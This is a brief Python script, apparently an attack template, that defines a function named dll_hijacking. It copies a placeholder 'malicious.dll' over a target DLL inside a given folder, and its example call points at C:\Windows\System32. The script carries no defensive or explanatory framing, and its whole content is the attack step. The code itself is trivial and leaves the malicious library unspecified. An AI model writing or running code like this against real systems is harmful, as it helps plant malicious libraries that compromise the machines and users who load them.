import shutil

def dll_hijacking(target_folder):
    malicious_dll = r"C:\path\to\malicious.dll"  # Replace with the path to your malicious DLL
    target_dll = target_folder + "\\target.dll"  # Replace with the target DLL in the system

    # Copy malicious DLL to target location
    shutil.copyfile(malicious_dll, target_dll)
    print(f"Malicious DLL copied to {target_dll}.")

# Example usage
dll_hijacking(r"C:\Windows\System32")